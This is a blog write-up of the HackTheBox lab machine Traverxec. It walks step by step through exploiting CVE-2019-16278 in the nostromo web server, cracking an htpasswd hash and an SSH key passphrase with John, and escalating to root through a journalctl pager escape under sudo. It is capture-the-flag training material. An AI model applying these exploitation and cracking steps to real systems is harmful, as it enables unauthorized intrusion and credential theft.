---
layout: single
title: "Traverxec - Linux HacktheBox Writeup"
categories:
  - Writeup
tags:
  - Easy
  - Linux
  - HackTheBox
classes: 
  - wide
---
Slowly getting used to hacking the boxes, I'll hopefully be taking more efficient notes for myself. 

Anyway, here's the next box: Traverxec!

**ENUMERATION**

Using Nmap:
```
sudo nmap -sS -sC -sV 10.10.10.165             

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)

80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Using Dirbuster after finding an open http port:

We can see so many directories and sub-directories. I was at a loss as to what to look into. So I took a step back. 

Looking at the version and header of the server, we can see that it's running Nostromo.
As habit, looking into the versions used by servers is a good way of finding known vulnerabilities and pre-existing CVEs. 
Doing some research shows known exploits relating to the same version used. Let's find out what it's about.  

The exploit is a known vulnerability identified as [CVE-2019-16278](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16278). 
It is a *Directory Traversal and Remote Command Execution* vulnerability. Directory traversal web vuln allows an attacker to read arbitrary files on a server running a web application, for example, our website found through Nmap in our case. 
These files can be very sensitive. These can include credentials for instance. Ultimately, the attacker might be able to write to these files allowing them to gain control over the server.  

Metasploit: 

Booting up msfconsole shows us the exploit we can use for the  nostromo server. So the exploit is going to run and push through a reverse shell as the user 'www-data'.
This is successful. 

**INITIAL FOOTHOLD**

Looking through our shell, we immediately find another user called David whose files we cannot access. 
It looks like we're going to have to find a way to escalate to David's privileges to find our first flag.

We check the usual files to see if we have any ability to read them. 
We can't check sudo -l command unfortunately. And we cannot read /etc/shadow. 

However, we can read the etc/passwd and etc/crontab files. Although nothing of interest seems to pop up.   
After doing a little research and thanks to the [System Manager's Manual for NHTTPD](http://www.nazgul.ch/dev/nostromo_man.html), we find out that there is a ./htpasswd file in the config files. 
Using the find command, we find said file in the following path: /*var/nostromo/conf/.htpasswd*

```
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
**LATERAL MOVEMENT**

We have a hash! Alright so running this through our John, the following decrypted hash is shown: Nowonly4me
Now at this point, I struggled to find the correct course of action when it came to this password. 
I couldn't find a way to use it. I decided to read a writeup in order to give myself a clue and a nudge in the right direction. 

The writeup suggests looking at the config files more closely and specifically at the the way directories are configured.

```
/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```
Reading the file in the conf directory shows us two interesting things. Back to the manual page, reading about homedirs explains that we can have remote access to a user's home directory if we add the ```~``` prefix to the user (In the URI). 
It also says that access can be restricted to one sub-directory via the homedirs_public option, which we now know is 'public_www'. 

So back in our shell, we should be able to directly access the following directory: 

```
$ cd /home/david/public_www
$ ls            
index.html  protected-file-area

$ cd protected-file-area/
$ ls
backup-ssh-identity-files.tgz
```
We have found some backup credentials. We can transfer these back to our machine and extract the content using the following command: 

```
tar -xvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```
I can then format the id_rsa key using ssh2john.py
```
/usr/share/john/ssh2john.py /home/user/david/.ssh/id_rsa > id_rsa_john
```
Running John to decrypt the key we get: 
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh id_rsa_john 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status

hunter           (/home/user/david/.ssh/id_rsa)
```
And finally, making sure to change the permission to the key to allow for the correct format, we should be able to SSH right in. 

```
chmod 600 /home/user/david/.ssh/id_rsa

ssh -i /home/user/david/.ssh/id_rsa  david@10.10.10.165
Enter passphrase for key '/home/user/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

david@traverxec:~$ whoami
david

david@traverxec:~$ ls -a
.   .bash_history  .bashrc  Enum_Rapp   .local    public_www  .ssh
..  .bash_logout   bin      LinEnum.sh  .profile  run-parts   user.txt

david@traverxec:~$ cat user.txt
```
We've succeeded in laterally moving/priv'escalating to David and in finding out the User Flag!

**PRIVILEGE ESCALATION**

Exploring the directories in David, /bin has a script called *server-stats.sh*. 
Not quite sure what this is, so let's read it. 

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
So we can see that it runs a linux command called journalctl. Ans better yet, it runs it as sudo. Hopefully without needing a password. A quick runs of the script confirms this. 
For the next part, I head over to [GTFObins](https://gtfobins.github.io/gtfobins/journalctl/), and find that we can escalate our privilege as sudo using the journalctl command. 

So the goal is to use the script to inject the arbitrary command and spawn a root shell. GTFObins explains that journalctl is likely to be used with *less*, a default pager. This means that the script runs by reading the last five logs. We're going to need put in our command by stopping the script from reading just yet. 
For this to happen we just type in the command without the piped cat command. And then proceed to type in our priv'esc command because we'll be in the pager.  

```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Wed 2021-07-28 13:08:05 EDT, end at Wed 2021-07-28 15:38:51 EDT
Jul 28 13:59:48 traverxec sudo[903]: pam_unix(sudo:auth): authentication failure
Jul 28 13:59:58 traverxec sudo[903]: www-data : command not allowed ; TTY=pts/1 
Jul 28 15:31:47 traverxec su[2892]: pam_unix(su:auth): authentication failure; l
Jul 28 15:31:49 traverxec su[2892]: FAILED SU (to david) www-data on pts/0
Jul 28 15:37:06 traverxec nhttpd[2324]: /../../../bin/sh sent a bad cgi header
!/bin/sh 

# whoami
root

# cat /root/root.txt
```

Success!